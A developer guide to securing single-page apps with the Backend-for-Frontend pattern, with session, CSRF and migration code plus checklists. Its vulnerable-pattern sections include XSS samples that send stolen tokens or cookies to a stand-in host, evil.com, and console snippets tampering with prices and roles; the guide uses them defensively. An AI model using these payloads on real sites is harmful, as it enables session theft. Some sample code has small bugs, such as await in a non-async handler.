# Securing Single-Page Applications: The Backend-for-Frontend Pattern

**Target Audience:** Developers working on SPAs that communicate directly with backend APIs  
**Purpose:** Security assessment and architectural guidance  
**Last Updated:** February 2026

---

## Executive Summary

**Critical Security Fact:** You cannot securely store long-term secrets (API keys, OAuth client secrets, private keys) in JavaScript applications. All client-side code and data is accessible to attackers.

If your SPA architecture currently looks like this:
```
Browser (React/Vue/Angular) → Backend API(s)
```

You likely have security vulnerabilities. This guide explains why and how to fix them.

**Recommended Architecture:**
```
Browser (SPA) → Backend-for-Frontend (BFF) → Backend API(s)
                     ↑
               Holds secrets,
               manages sessions,
               enforces security
```

---

## Table of Contents

1. [The Fundamental Problem](#the-fundamental-problem)
2. [Common Vulnerable Patterns](#common-vulnerable-patterns)
3. [The BFF Pattern Solution](#the-bff-pattern-solution)
4. [Detailed Implementation Guide](#detailed-implementation-guide)
5. [Trust Model & Security Mechanisms](#trust-model--security-mechanisms)
6. [Migration Guide](#migration-guide)
7. [Security Checklist](#security-checklist)
8. [References & Further Reading](#references--further-reading)

---

## The Fundamental Problem

### What You Cannot Do in JavaScript Clients

```javascript
// ❌ CRITICAL VULNERABILITY - Never do this
const API_KEY = 'sk_live_abc123';
const CLIENT_SECRET = 'oauth_secret_xyz';
const PRIVATE_KEY = '-----BEGIN PRIVATE KEY-----...';

fetch('https://api.service.com/data', {
  headers: { 'Authorization': `Bearer ${API_KEY}` }
});
```

**Why this is dangerous:**
- All JavaScript code is visible in browser DevTools
- Source maps reveal your entire codebase
- Environment variables bundled into the app are public
- Attackers can extract and abuse your credentials
- One compromised key can affect all users

### The Attack Surface

Users have complete control over their browser:

```javascript
// Attackers can (and will):
// 1. Read all your code
console.log(window.myApp);

// 2. View all network requests
// (Chrome DevTools → Network tab)

// 3. Modify your code at runtime
window.authenticatedFetch = () => console.log('Hijacked!');

// 4. Access all browser storage
console.log(localStorage);
console.log(sessionStorage);

// 5. Make arbitrary API requests
fetch('/api/endpoint', { /* custom params */ });
```

**You cannot prevent any of this.** Security must assume the client is compromised.

---

## Common Vulnerable Patterns

### 1. API Keys in Frontend Code

**Vulnerable Pattern:**
```javascript
// .env file (bundled into app)
VITE_API_KEY=sk_live_abc123
REACT_APP_SECRET=oauth_secret

// JavaScript code
const apiKey = import.meta.env.VITE_API_KEY;
fetch('https://api.service.com/data', {
  headers: { 'X-API-Key': apiKey }
});
```

**Impact:** Anyone can extract your API key and:
- Consume your API quota
- Access your account
- Incur costs on your behalf
- Access all data your key can reach

### 2. OAuth Tokens in localStorage

**Vulnerable Pattern:**
```javascript
// After OAuth login
localStorage.setItem('access_token', response.access_token);
localStorage.setItem('refresh_token', response.refresh_token);

// Later requests
const token = localStorage.getItem('access_token');
fetch('/api/data', {
  headers: { 'Authorization': `Bearer ${token}` }
});
```

**Impact:** Vulnerable to XSS attacks:
```javascript
// If attacker injects this via XSS:
<script>
  const stolenTokens = {
    access: localStorage.getItem('access_token'),
    refresh: localStorage.getItem('refresh_token')
  };
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(stolenTokens)
  });
</script>
```

### 3. Client-Side Only Authorization

**Vulnerable Pattern:**
```javascript
// Frontend checks user role
if (user.role === 'admin') {
  return <AdminPanel />;
}

// API request with no server-side check
async function deleteAllUsers() {
  return fetch('/api/users', { method: 'DELETE' });
}
```

**Impact:** Attacker can bypass checks:
```javascript
// Open browser console
user.role = 'admin'; // Modify in memory
deleteAllUsers(); // Now can call admin functions

// Or directly via console
fetch('/api/users', { method: 'DELETE' });
```

### 4. Trusting Client Input

**Vulnerable Pattern:**
```javascript
// Frontend (e-commerce)
const order = {
  productId: 'laptop-123',
  quantity: 1,
  price: 999.99 // Client-provided price
};

fetch('/api/orders', {
  method: 'POST',
  body: JSON.stringify(order)
});

// Backend trusts the price
app.post('/api/orders', (req, res) => {
  const { productId, quantity, price } = req.body;
  const total = price * quantity; // ❌ Using client price
  createOrder(req.userId, productId, quantity, total);
});
```

**Impact:** Attacker changes price:
```javascript
// Browser console
fetch('/api/orders', {
  method: 'POST',
  body: JSON.stringify({
    productId: 'laptop-123',
    quantity: 1,
    price: 0.01 // ❌ Buy laptop for $0.01
  })
});
```

---

## The BFF Pattern Solution

### Architecture Overview

```
┌─────────────────────────────────────────────────────────┐
│  Browser (User's Device)                                │
│                                                          │
│  ┌────────────────────────────────────────┐            │
│  │  Single Page Application (SPA)         │            │
│  │  React / Vue / Angular / Svelte        │            │
│  │                                         │            │
│  │  - No secrets                           │            │
│  │  - No long-lived tokens                │            │
│  │  - HTTPOnly cookies only               │            │
│  │  - Makes simple HTTP requests          │            │
│  └──────────────┬──────────────────────────┘            │
│                 │                                        │
│                 │ HTTPS (same domain)                   │
│                 │ credentials: 'include'                │
└─────────────────┼────────────────────────────────────────┘
                  │
                  ▼
    ┌──────────────────────────────────────────────────┐
    │  Backend-for-Frontend (BFF)                      │
    │  Node.js / Python / Go / Java                    │
    │                                                   │
    │  Responsibilities:                               │
    │  ✓ Holds API keys & secrets                     │
    │  ✓ Manages OAuth flows                          │
    │  ✓ Stores refresh tokens                        │
    │  ✓ Handles session management                   │
    │  ✓ Performs authorization checks                │
    │  ✓ Orchestrates multiple API calls             │
    │  ✓ Refreshes tokens automatically               │
    │  ✓ Rate limiting                                │
    │  ✓ Input validation                             │
    │  └──────────────┬───────────────────────────────┘
                       │
                       │ Internal network
                       │ Bearer tokens / API keys
                       ▼
         ┌─────────────────────────────────────┐
         │  Backend APIs / Microservices        │
         │                                      │
         │  - User Service                      │
         │  - Data Service                      │
         │  - Payment Service                   │
         │  - Third-party APIs                  │
         └──────────────────────────────────────┘
```

### Core Principles

1. **Secrets Stay Server-Side:** API keys, OAuth secrets, and private keys never touch the browser
2. **Session-Based Auth:** Use HTTPOnly cookies for session IDs, not tokens
3. **Server-Side Token Management:** BFF handles OAuth flows and token refresh
4. **Zero Trust Client:** All security enforcement happens on the BFF
5. **Single Origin:** SPA and BFF on same domain (no CORS complexity)

---

## Detailed Implementation Guide

### 1. Authentication Flow

#### Initial Login

**Frontend (React example):**
```javascript
// LoginForm.jsx
async function handleLogin(email, password) {
  try {
    const response = await fetch('https://yourdomain.com/auth/login', {
      method: 'POST',
      credentials: 'include', // Critical: allows cookies
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password })
    });
    
    if (response.ok) {
      const { user } = await response.json();
      // No tokens! Session is in HTTPOnly cookie
      setCurrentUser(user);
      navigate('/dashboard');
    } else {
      setError('Invalid credentials');
    }
  } catch (error) {
    setError('Login failed');
  }
}
```

**BFF (Node.js/Express example):**
```javascript
// auth.controller.js
const express = require('express');
const crypto = require('crypto');

app.post('/auth/login', async (req, res) => {
  const { email, password } = req.body;
  
  // 1. Validate credentials with your auth service
  // (Could be Auth0, Firebase, Cognito, or custom)
  const authResult = await authService.authenticate(email, password);
  
  if (!authResult.success) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // 2. Exchange for API access tokens (if using OAuth)
  const tokens = await oauthClient.exchangeCodeForTokens(
    authResult.authorizationCode
  );
  
  // 3. Create session and store tokens SERVER-SIDE
  const sessionId = crypto.randomBytes(32).toString('hex');
  
  await sessionStore.set(sessionId, {
    userId: authResult.userId,
    accessToken: tokens.access_token,
    refreshToken: tokens.refresh_token,
    expiresAt: Date.now() + (tokens.expires_in * 1000),
    createdAt: Date.now()
  }, {
    ttl: 3600 // 1 hour session
  });
  
  // 4. Send session ID to client via HTTPOnly cookie
  res.cookie('session', sessionId, {
    httpOnly: true,      // JavaScript cannot read
    secure: true,        // HTTPS only
    sameSite: 'strict',  // CSRF protection
    maxAge: 3600000      // 1 hour
  });
  
  // 5. Send CSRF token (readable by JS for headers)
  const csrfToken = generateCsrfToken(sessionId);
  res.cookie('csrf_token', csrfToken, {
    secure: true,
    sameSite: 'strict',
    maxAge: 3600000
  });
  
  // 6. Return user data (no tokens!)
  res.json({ 
    user: {
      id: authResult.userId,
      email: authResult.email,
      name: authResult.name
    }
  });
});

// CSRF token generation (HMAC-based)
function generateCsrfToken(sessionId) {
  const secret = process.env.CSRF_SECRET;
  return crypto
    .createHmac('sha256', secret)
    .update(sessionId)
    .digest('hex');
}
```

**HTTP Response:**
```http
HTTP/1.1 200 OK
Set-Cookie: session=7f3d8c2a1b9e4f5a...; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
Set-Cookie: csrf_token=def456uvw...; Secure; SameSite=Strict; Max-Age=3600
Content-Type: application/json

{
  "user": {
    "id": "user-123",
    "email": "user@example.com",
    "name": "Alice Smith"
  }
}
```

### 2. Authenticated API Requests

#### Frontend Helper Module

```javascript
// api.js - Centralized API client
const API_BASE = process.env.REACT_APP_API_URL || 'https://yourdomain.com';

// Helper to read cookies
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
  return null;
}

// Base request function
async function request(endpoint, options = {}) {
  const csrfToken = getCookie('csrf_token');
  
  const response = await fetch(`${API_BASE}${endpoint}`, {
    ...options,
    credentials: 'include', // Always send cookies
    headers: {
      'Content-Type': 'application/json',
      // Include CSRF token for state-changing requests
      ...(csrfToken && ['POST', 'PUT', 'DELETE', 'PATCH'].includes(options.method || 'GET') && {
        'X-CSRF-Token': csrfToken
      }),
      ...options.headers
    }
  });
  
  // Handle common errors
  if (response.status === 401) {
    // Session expired - redirect to login
    window.location.href = '/login';
    throw new Error('Session expired');
  }
  
  if (response.status === 403) {
    throw new Error('Forbidden');
  }
  
  if (!response.ok) {
    const error = await response.json().catch(() => ({ error: 'Request failed' }));
    throw new Error(error.error || 'Request failed');
  }
  
  return response.json();
}

// API methods
export const api = {
  // Auth
  login: (email, password) =>
    request('/auth/login', {
      method: 'POST',
      body: JSON.stringify({ email, password })
    }),
  
  logout: () =>
    request('/auth/logout', { method: 'POST' }),
  
  getCurrentUser: () =>
    request('/auth/me'),
  
  // Notes CRUD
  getNotes: () =>
    request('/api/notes'),
  
  getNote: (id) =>
    request(`/api/notes/${id}`),
  
  createNote: (title, content) =>
    request('/api/notes', {
      method: 'POST',
      body: JSON.stringify({ title, content })
    }),
  
  updateNote: (id, updates) =>
    request(`/api/notes/${id}`, {
      method: 'PATCH',
      body: JSON.stringify(updates)
    }),
  
  deleteNote: (id) =>
    request(`/api/notes/${id}`, {
      method: 'DELETE'
    })
};
```

#### BFF Request Handlers

```javascript
// middleware/auth.js
async function authenticateMiddleware(req, res, next) {
  const sessionId = req.cookies.session;
  
  // 1. Check session cookie exists
  if (!sessionId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  // 2. Retrieve session from store (Redis, DB, etc.)
  const session = await sessionStore.get(sessionId);
  
  if (!session) {
    return res.status(401).json({ error: 'Invalid session' });
  }
  
  // 3. Check expiration
  if (Date.now() > session.expiresAt) {
    await sessionStore.delete(sessionId);
    return res.status(401).json({ error: 'Session expired' });
  }
  
  // 4. Validate CSRF token for state-changing requests
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    const providedCsrf = req.headers['x-csrf-token'];
    const expectedCsrf = generateCsrfToken(sessionId);
    
    if (providedCsrf !== expectedCsrf) {
      return res.status(403).json({ error: 'Invalid CSRF token' });
    }
  }
  
  // 5. Attach session to request
  req.session = session;
  req.sessionId = sessionId;
  next();
}

// notes.controller.js
app.get('/api/notes', authenticateMiddleware, async (req, res) => {
  const session = req.session;
  
  try {
    // Call backend API with stored access token
    const response = await fetch('https://api.internal/notes', {
      headers: {
        'Authorization': `Bearer ${session.accessToken}`,
        'X-User-ID': session.userId
      }
    });
    
    // Handle token expiration
    if (response.status === 401) {
      // Access token expired - try refresh
      const newTokens = await refreshAccessToken(session.refreshToken);
      
      if (newTokens) {
        // Update session with new tokens
        await sessionStore.update(req.sessionId, {
          accessToken: newTokens.access_token,
          expiresAt: Date.now() + (newTokens.expires_in * 1000)
        });
        
        // Retry with new token
        const retryResponse = await fetch('https://api.internal/notes', {
          headers: { 'Authorization': `Bearer ${newTokens.access_token}` }
        });
        
        const notes = await retryResponse.json();
        return res.json(notes);
      }
      
      // Refresh failed - session truly expired
      await sessionStore.delete(req.sessionId);
      return res.status(401).json({ error: 'Session expired' });
    }
    
    const notes = await response.json();
    
    // Additional server-side filtering by userId
    // (Defense in depth - don't trust backend API alone)
    const userNotes = notes.filter(note => note.userId === session.userId);
    
    res.json(userNotes);
    
  } catch (error) {
    console.error('Error fetching notes:', error);
    res.status(500).json({ error: 'Failed to fetch notes' });
  }
});

app.post('/api/notes', authenticateMiddleware, async (req, res) => {
  const { title, content } = req.body;
  const session = req.session;
  
  // Input validation
  if (!title || title.length > 200) {
    return res.status(400).json({ error: 'Invalid title' });
  }
  
  if (!content || content.length > 50000) {
    return res.status(400).json({ error: 'Content too long' });
  }
  
  try {
    // Call backend API
    const response = await fetch('https://api.internal/notes', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${session.accessToken}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        title,
        content,
        userId: session.userId, // Server provides user ID
        createdAt: new Date().toISOString() // Server provides timestamp
      })
    });
    
    const newNote = await response.json();
    res.status(201).json(newNote);
    
  } catch (error) {
    console.error('Error creating note:', error);
    res.status(500).json({ error: 'Failed to create note' });
  }
});

app.delete('/api/notes/:id', authenticateMiddleware, async (req, res) => {
  const { id } = req.params;
  const session = req.session;
  
  try {
    // 1. Fetch note to verify ownership
    const noteResponse = await fetch(`https://api.internal/notes/${id}`, {
      headers: { 'Authorization': `Bearer ${session.accessToken}` }
    });
    
    if (!noteResponse.ok) {
      return res.status(404).json({ error: 'Note not found' });
    }
    
    const note = await noteResponse.json();
    
    // 2. Authorization check - critical!
    if (note.userId !== session.userId) {
      return res.status(403).json({ 
        error: 'Forbidden: You can only delete your own notes' 
      });
    }
    
    // 3. Perform deletion
    await fetch(`https://api.internal/notes/${id}`, {
      method: 'DELETE',
      headers: { 'Authorization': `Bearer ${session.accessToken}` }
    });
    
    res.json({ success: true });
    
  } catch (error) {
    console.error('Error deleting note:', error);
    res.status(500).json({ error: 'Failed to delete note' });
  }
});

// Token refresh helper
async function refreshAccessToken(refreshToken) {
  try {
    const response = await fetch('https://oauth-provider.com/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        grant_type: 'refresh_token',
        refresh_token: refreshToken,
        client_id: process.env.OAUTH_CLIENT_ID,
        client_secret: process.env.OAUTH_CLIENT_SECRET
      })
    });
    
    if (response.ok) {
      return await response.json();
    }
    
    return null;
  } catch (error) {
    console.error('Token refresh failed:', error);
    return null;
  }
}
```

### 3. Session Store Configuration

**Redis Example:**
```javascript
// sessionStore.js
const Redis = require('ioredis');

const redis = new Redis({
  host: process.env.REDIS_HOST,
  port: process.env.REDIS_PORT,
  password: process.env.REDIS_PASSWORD,
  tls: process.env.NODE_ENV === 'production' ? {} : undefined
});

const SESSION_PREFIX = 'session:';

module.exports = {
  async set(sessionId, data, options = {}) {
    const key = SESSION_PREFIX + sessionId;
    const value = JSON.stringify(data);
    
    if (options.ttl) {
      await redis.setex(key, options.ttl, value);
    } else {
      await redis.set(key, value);
    }
  },
  
  async get(sessionId) {
    const key = SESSION_PREFIX + sessionId;
    const value = await redis.get(key);
    
    if (!value) return null;
    
    try {
      return JSON.parse(value);
    } catch (error) {
      console.error('Session parse error:', error);
      return null;
    }
  },
  
  async update(sessionId, updates) {
    const session = await this.get(sessionId);
    if (!session) return false;
    
    const updated = { ...session, ...updates };
    await this.set(sessionId, updated, { ttl: 3600 });
    return true;
  },
  
  async delete(sessionId) {
    const key = SESSION_PREFIX + sessionId;
    await redis.del(key);
  },
  
  async extend(sessionId, ttl) {
    const key = SESSION_PREFIX + sessionId;
    await redis.expire(key, ttl);
  }
};
```

### 4. Additional Security Middleware

```javascript
// middleware/security.js
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');

// Rate limiting
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP, please try again later',
  standardHeaders: true,
  legacyHeaders: false
});

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // 5 login attempts per 15 minutes
  message: 'Too many login attempts, please try again later',
  skipSuccessfulRequests: true
});

// Security headers
function securityHeaders(req, res, next) {
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'"], // Adjust based on your needs
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:"],
        connectSrc: ["'self'"],
        fontSrc: ["'self'"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"]
      }
    },
    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true
    }
  })(req, res, next);
}

// Request size limits
const bodyParser = require('body-parser');

const jsonParser = bodyParser.json({ 
  limit: '10kb' // Prevent large payload attacks
});

module.exports = {
  apiLimiter,
  loginLimiter,
  securityHeaders,
  jsonParser
};
```

---

## Trust Model & Security Mechanisms

### How Frontend and BFF Trust Each Other

#### Frontend → BFF Trust

**1. HTTPS/TLS Certificates**
```
Browser connects to https://yourdomain.com
   ↓
Server presents TLS certificate signed by CA
   ↓
Browser validates:
  ✓ Certificate matches domain
  ✓ Certificate signed by trusted CA (Let's Encrypt, etc.)
  ✓ Certificate not expired/revoked
   ↓
Encrypted channel established
```

**2. Same-Origin Policy (Browser Enforcement)**
```javascript
// Browser automatically enforces:
// - Cookies only sent to matching origin
// - No cross-origin reads without CORS
// - localStorage/sessionStorage isolated by origin

// Attacker's site (https://evil.com) CANNOT:
// - Read cookies from yourdomain.com
// - Access localStorage from yourdomain.com
// - Read API responses from yourdomain.com
```

**3. Content Security Policy**
```javascript
// BFF tells browser what to trust
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; connect-src 'self' https://yourdomain.com"
  );
  next();
});

// Browser blocks:
// - Scripts from unauthorized domains
// - Connections to unauthorized endpoints
// - Inline scripts without nonce
```

#### BFF → Frontend Trust

**1. Session Validation (Cryptographic)**
```javascript
// Session ID is cryptographically random
const sessionId = crypto.randomBytes(32).toString('hex');
// 2^256 possibilities - impossible to guess

// Stored server-side with associated data
await sessionStore.set(sessionId, {
  userId: 'user-123',
  accessToken: 'api-token',
  createdAt: Date.now()
});

// BFF trusts the SESSION, not the code
// Attacker cannot forge valid session IDs
```

**2. CSRF Token Validation**
```javascript
// Token tied to session via HMAC
function generateCsrfToken(sessionId) {
  return crypto
    .createHmac('sha256', process.env.CSRF_SECRET)
    .update(sessionId)
    .digest('hex');
}

// Attacker's cross-site request:
// ✓ Has session cookie (browser auto-sends)
// ❌ Cannot read csrf_token cookie (Same-Origin Policy)
// ❌ Cannot compute valid CSRF token (no CSRF_SECRET)
// → Request rejected
```

**3. SameSite Cookies (Browser Enforcement)**
```javascript
res.cookie('session', sessionId, {
  sameSite: 'strict' // or 'lax'
});

// Browser automatically blocks cross-site requests
// Attacker on evil.com cannot make requests with victim's cookies
```

### What Users CAN and CANNOT Do

#### Users CAN (by design):
```javascript
// Open browser console and:
// 1. See all JavaScript code
console.log(window);

// 2. Make requests to BFF
fetch('/api/notes', { credentials: 'include' });

// 3. Access their own data
// (authenticated and authorized)

// 4. Use API via curl/Postman
curl https://yourdomain.com/api/notes \
  -H "Cookie: session=their-session-id" \
  -H "X-CSRF-Token: their-csrf-token"
```

**This is okay because:**
- They can only access THEIR OWN data (authorization checks)
- Server validates and enforces all rules
- Rate limiting prevents abuse
- They're authenticated users doing legitimate actions

#### Users CANNOT:
```javascript
// 1. Access other users' data
fetch('/api/notes/other-user-note-123', { method: 'DELETE' });
// ❌ BFF checks: note.userId !== session.userId → 403 Forbidden

// 2. Forge sessions
document.cookie = 'session=fake-session-id';
// ❌ Session doesn't exist in server-side store → 401 Unauthorized

// 3. Bypass authorization
fetch('/api/admin/delete-all-users');
// ❌ BFF checks: session.role !== 'admin' → 403 Forbidden

// 4. Manipulate prices/data
fetch('/api/orders', {
  body: JSON.stringify({ productId: 'laptop', price: 0.01 })
});
// ❌ BFF fetches real price from database, ignores client value

// 5. Steal sessions via XSS
<script>
  fetch('https://evil.com/steal?session=' + document.cookie);
</script>
// ❌ Session cookie is HTTPOnly (JavaScript cannot read)
// ❌ CSP blocks connection to evil.com
```

### The Golden Rules

1. **Never Trust Client Input**
   - User ID comes from session, not request
   - Prices from database, not client
   - Timestamps from server, not client

2. **Server is Source of Truth**
   - All authorization checks on server
   - All data validation on server
   - All business logic on server

3. **Defense in Depth**
   - HTTPOnly cookies (XSS protection)
   - CSRF tokens (CSRF protection)
   - SameSite cookies (automatic CSRF protection)
   - CSP (exfiltration protection)
   - Rate limiting (abuse protection)
   - Input validation (injection protection)

---

## Migration Guide

### Assessing Your Current Architecture

**Risk Assessment Checklist:**

- [ ] Do you store API keys in frontend environment variables?
- [ ] Do you store OAuth tokens in localStorage/sessionStorage?
- [ ] Do you make direct API calls from frontend to third-party services?
- [ ] Do you handle OAuth flows entirely in the frontend?
- [ ] Do you rely on client-side only authorization checks?
- [ ] Do you trust client-provided data (user IDs, prices, roles)?
- [ ] Do you have CORS configurations for multiple external APIs?

**If you checked ANY box above, you have security vulnerabilities.**

### Migration Strategy

#### Phase 1: Set Up BFF Infrastructure

**1. Create BFF Server**
```bash
# Example: Node.js/Express BFF
mkdir bff-server
cd bff-server
npm init -y
npm install express express-rate-limit helmet cookie-parser ioredis cors
```

**2. Configure Session Store**
```javascript
// Choose: Redis, PostgreSQL, MongoDB, or in-memory (dev only)
// Production: Use distributed store (Redis recommended)
```

**3. Set Up Authentication Endpoint**
```javascript
// Start with login/logout endpoints
// Migrate from frontend-managed tokens to server-managed sessions
```

#### Phase 2: Migrate Authentication

**Before (Vulnerable):**
```javascript
// Frontend handles OAuth
const { tokens } = await oauth.getTokens(code);
localStorage.setItem('access_token', tokens.access_token);
localStorage.setItem('refresh_token', tokens.refresh_token);
```

**After (Secure):**
```javascript
// Frontend just redirects to BFF
window.location.href = '/auth/login';

// BFF handles OAuth and stores tokens server-side
app.get('/auth/callback', async (req, res) => {
  const tokens = await oauth.exchangeCode(req.query.code);
  const sessionId = createSession(tokens);
  res.cookie('session', sessionId, { httpOnly: true, secure: true });
  res.redirect('/dashboard');
});
```

#### Phase 3: Migrate API Calls

**Before (Direct API calls):**
```javascript
// Frontend calls API directly
const data = await fetch('https://api.service.com/data', {
  headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
});
```

**After (Via BFF):**
```javascript
// Frontend calls BFF
const data = await fetch('/api/data', {
  credentials: 'include' // Sends session cookie
});

// BFF proxies to API
app.get('/api/data', authenticateMiddleware, async (req, res) => {
  const response = await fetch('https://api.service.com/data', {
    headers: { 'Authorization': `Bearer ${req.session.accessToken}` }
  });
  res.json(await response.json());
});
```

#### Phase 4: Implement Security Layers

**Priority order:**
1. HTTPOnly session cookies
2. CSRF protection
3. Rate limiting
4. Input validation
5. CSP headers
6. Authorization checks
7. Audit logging

#### Phase 5: Remove Client-Side Secrets

```bash
# Remove from .env files
- REACT_APP_API_KEY
- VITE_SECRET_KEY
- NEXT_PUBLIC_TOKEN

# Move to BFF environment
+ API_KEY (server-only)
+ OAUTH_CLIENT_SECRET (server-only)
+ CSRF_SECRET (server-only)
```

### Minimal BFF Implementation

**Smallest viable BFF (Node.js):**
```javascript
// server.js
const express = require('express');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');

const app = express();
const sessions = new Map(); // Use Redis in production!

app.use(express.json());
app.use(cookieParser());

// Serve frontend
app.use(express.static('dist'));

// Login
app.post('/auth/login', async (req, res) => {
  const { email, password } = req.body;
  
  // Validate credentials (your logic here)
  const user = await validateUser(email, password);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
  
  // Create session
  const sessionId = crypto.randomBytes(32).toString('hex');
  sessions.set(sessionId, { userId: user.id, createdAt: Date.now() });
  
  // Set cookie
  res.cookie('session', sessionId, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 3600000
  });
  
  res.json({ user });
});

// Authenticated endpoint
app.get('/api/data', (req, res) => {
  const session = sessions.get(req.cookies.session);
  if (!session) return res.status(401).json({ error: 'Unauthorized' });
  
  // Fetch data using server-side API key
  const data = await fetchDataFromAPI(session.userId);
  res.json(data);
});

app.listen(3000);
```

---

## Security Checklist

### Pre-Deployment Checklist

#### Authentication & Sessions
- [ ] HTTPOnly cookies for session IDs
- [ ] Secure flag enabled (HTTPS only)
- [ ] SameSite=Strict or Lax
- [ ] Session expiration implemented (1-24 hours)
- [ ] Session refresh mechanism
- [ ] Logout clears server-side session
- [ ] No tokens in localStorage/sessionStorage
- [ ] No secrets in frontend code/env vars

#### CSRF Protection
- [ ] CSRF tokens for state-changing requests
- [ ] CSRF tokens validated server-side
- [ ] Tokens tied to sessions (HMAC)
- [ ] SameSite cookie attribute set

#### Authorization
- [ ] User ID from session, never from client
- [ ] Resource ownership checked before mutations
- [ ] Role-based access control (if applicable)
- [ ] Authorization checks on EVERY endpoint
- [ ] No client-side only auth checks

#### Input Validation
- [ ] All inputs validated server-side
- [ ] Type checking (string, number, etc.)
- [ ] Length limits enforced
- [ ] Whitelist validation where possible
- [ ] Reject unexpected fields
- [ ] Sanitize before database queries

#### Rate Limiting
- [ ] Global rate limits (per IP)
- [ ] Endpoint-specific limits
- [ ] Stricter limits on auth endpoints
- [ ] Rate limits on expensive operations
- [ ] DDoS protection (Cloudflare, AWS Shield)

#### Security Headers
- [ ] Content-Security-Policy configured
- [ ] X-Content-Type-Options: nosniff
- [ ] X-Frame-Options: DENY
- [ ] Strict-Transport-Security (HSTS)
- [ ] Referrer-Policy configured

#### HTTPS/TLS
- [ ] Valid TLS certificate
- [ ] TLS 1.2+ only
- [ ] HSTS preload submitted
- [ ] Redirect HTTP → HTTPS

#### Error Handling
- [ ] Generic error messages to client
- [ ] Detailed errors logged server-side
- [ ] No stack traces in production
- [ ] No sensitive data in error responses

#### Logging & Monitoring
- [ ] Authentication attempts logged
- [ ] Authorization failures logged
- [ ] Rate limit violations logged
- [ ] Suspicious patterns monitored
- [ ] Sensitive data redacted from logs

### Code Review Checklist

**Watch for these patterns:**

#### ❌ Dangerous
```javascript
// Client provides user ID
const { userId } = req.body;
await deleteUser(userId);

// Client provides price
const { price } = req.body;
await createOrder({ price });

// Client provides role
const { role } = req.body;
await updateUser({ role });

// No authorization check
app.delete('/api/resource/:id', async (req, res) => {
  await db.delete(req.params.id);
});

// Token in response
res.json({ 
  user: user,
  token: accessToken // ❌ Never!
});
```

#### ✓ Safe
```javascript
// Server determines user ID
const userId = req.session.userId;
await deleteUser(userId);

// Server fetches price
const product = await db.products.findById(productId);
await createOrder({ price: product.price });

// Server determines role
const role = await getRoleFromDatabase(req.session.userId);

// Authorization check
app.delete('/api/resource/:id', async (req, res) => {
  const resource = await db.find(req.params.id);
  if (resource.ownerId !== req.session.userId) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  await db.delete(req.params.id);
});

// No tokens in response
res.json({ user: user }); // Session in cookie
```

---

## References & Further Reading

### Standards & Specifications

1. **OAuth 2.0 for Browser-Based Apps** (IETF Best Current Practice)  
   https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps  
   *Comprehensive guidance on OAuth in browser environments*

2. **RFC 6265: HTTP State Management Mechanism (Cookies)**  
   https://datatracker.ietf.org/doc/html/rfc6265  
   *Official specification for cookie security*

3. **RFC 6749: OAuth 2.0 Authorization Framework**  
   https://datatracker.ietf.org/doc/html/rfc6749  
   *OAuth 2.0 specification*

4. **RFC 6750: OAuth 2.0 Bearer Token Usage**  
   https://datatracker.ietf.org/doc/html/rfc6750  
   *How to use bearer tokens securely*

### OWASP Resources

5. **OWASP Top 10 Web Application Security Risks**  
   https://owasp.org/www-project-top-ten/  
   *Most critical web security risks*

6. **OWASP Authentication Cheat Sheet**  
   https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html  
   *Best practices for authentication*

7. **OWASP Session Management Cheat Sheet**  
   https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html  
   *Session security guidelines*

8. **OWASP CSRF Prevention Cheat Sheet**  
   https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html  
   *CSRF attack prevention*

### Academic Papers

9. **Fett, D., Küsters, R., & Schmitz, G. (2016).** "A Comprehensive Formal Security Analysis of OAuth 2.0."  
   *Proceedings of the 2016 ACM SIGSAC Conference on Computer and Communications Security*, 1204-1215.  
   https://dl.acm.org/doi/10.1145/2976749.2978385  
   *Formal analysis of OAuth security properties*

10. **Barth, A. (2011).** "The Web Origin Concept." RFC 6454, IETF.  
    https://www.rfc-editor.org/rfc/rfc6454  
    *Same-Origin Policy specification*

### Architecture Patterns

11. **Newman, S. (2015).** "Backends for Frontends Pattern"  
    https://samnewman.io/patterns/architectural/bff/  
    *Original BFF pattern documentation*

12. **Calçado, P. (2015).** "The Backend for Frontend Pattern (BFF)"  
    https://philcalcado.com/2015/09/18/the_back_end_for_front_end_pattern_bff.html  
    *Detailed BFF explanation*

### Developer Guides

13. **MDN Web Docs: Same-Origin Policy**  
    https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy  
    *Browser security model*

14. **MDN Web Docs: Content Security Policy (CSP)**  
    https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP  
    *CSP implementation guide*

15. **Web Crypto API Specification**  
    https://www.w3.org/TR/WebCryptoAPI/  
